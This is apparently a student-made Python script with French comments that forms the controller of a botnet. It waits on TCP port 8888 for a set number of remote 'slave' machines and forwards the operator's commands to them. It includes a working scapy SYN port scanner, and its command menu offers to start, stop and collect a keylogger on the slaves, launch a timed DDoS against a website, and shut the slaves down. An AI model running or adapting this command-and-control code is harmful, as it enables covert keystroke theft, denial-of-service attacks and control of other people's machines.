import socket
from threading import Thread
import argparse
from scapy.all import *


class MasterThread:

#Cette classe va gérer l'émision et la réception des messages envoyé aux slaves

    def __init__(self,slaves,sockt):
        self.slaves = slaves                                 #Liste contenant les informations des différents slaves
        self.sockt = sockt                                   #Socket qui permettra de recevoir la requête du slave
        self.ip = ""                                         #Variable qui permet de stocker l'addresse ip utilisée dans la méthode scan

    def reception(self):                                     #Méthode de réception des messages des slaves
        try:
            arret = False
            while not arret:
                requeteslave = self.sockt.recv(1024)
                msg = requeteslave.decode()
                print(msg)
        except ConnectionResetError:                                           #Gestion d'erreur: connexion avec le slave perdu
            print("Une connexion à l'un des slaves a été interrompue.")

    def emission(self):                                      #Méthode d'émission des messages envoyés auxx slaves

        msg = str(input(">> "))
        while True:
            if msg [:10] == 'scan_port(' and msg[-1:]==")":          #On vérifie à l'aide de séquence si l'utilisateur rentre la commande scan_port()
                self.ip = msg[10:len(msg)-1]                         #On stocke dans la variable ip, l'addresse ip entré par l'tilisateur
                self.scan()                                          #Lancement de la méthode scan

            for slave in self.slaves:
                try:
                    slave.send(msg.encode())                             #Envoie du message à chaque slave
                except ConnectionResetError:
                    print("Un des slaves s'est déconnecté, il faut redémarrer le programme pour refresh la liste de slave.")

            msg =str(input(">> "))

    def scan(self):                                           #Méthode de scan port ouvert d'un ordinateur présent sur le réseau

        for port in range(1,1024):
            syn = (IP(dst=self.ip)) / TCP(dport=port, flags="S")           #Création d'un paquet avec l'ip ciblée encapsulée dans un paquet TCP des port 1 à 1024 ayant comme flag "Synchronise"

            resp = sr1(syn, verbose=0)                                     #Utilisation de la méthode send and recieve de notre paquet syn avec le mode verbose désactivé

            if resp.haslayer(TCP) and resp.getlayer(TCP).flags == 0x12:    #Si l'hôte répond avec le flag 0x12 (SYN ACK)
                print("le port TCP", port, "du PC",self.ip,"est ouvert")


soc_tcp_r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)              #Crétion du socket de réception des messages des slaves
soc_tcp_r.bind(("", 8888))                                                 #On relie le socket au port 8888

liste_slave=[]

parser = argparse.ArgumentParser()
parser.add_argument('Nombre_slave', help= "Nombre de machines slaves controlées à distance par le master.", type=int)

args = parser.parse_args()                                                 #Création de l'argparse qui permettra de déterminer le nombre de slaves à écouter

print("#*******************************************************************************************************#")
print("#                                    Commandes disponibles                                              #")
print("#   scan_port(ip): Affiche les ports sur le machine ciblée.                                             #")
print("#   start_log(): Lance un keylogger sur les machines slaves.                                            #")
print("#   stop_log(): Mets fin à l'écoute du keylogger sur les slaves                                          #")
print("#   get-log(nombre de lignes): Renvoie les dernières lignes entrées dans le fichiers logs des slaves.   #")
print("#   ddos(ip,sec): Les slaves effectuent une requête HTTP vers un site web à une heure précise.          #")
print("#   shutdown(): Éteints toutes les machines slaves.                                                     #")
print("#*******************************************************************************************************#")

while True:

    soc_tcp_r.listen(10)                                                     #La socket est à l"écoute" de connexion entrante
    distant_socket, addr = soc_tcp_r.accept()                                #Autorise un hôte
    liste_slave.append(distant_socket)                                       #Stocke la socket de l'hôte dans la liste de slave

    r_thread = Thread(target=MasterThread(liste_slave, distant_socket).reception)         #Thread qui permettra de recevoir les messages des slaves
    r_thread.start()

    if len(liste_slave) == args.Nombre_slave :                                             #Lorsque le nombre de slaves voulu par l'utilisateur est atteint, la méthode émission est démarré
        e_thread = Thread(target=MasterThread(liste_slave, distant_socket).emission)
        e_thread.start()                                                                   #Thread qui permettra d'envoyer des messages aux slaves
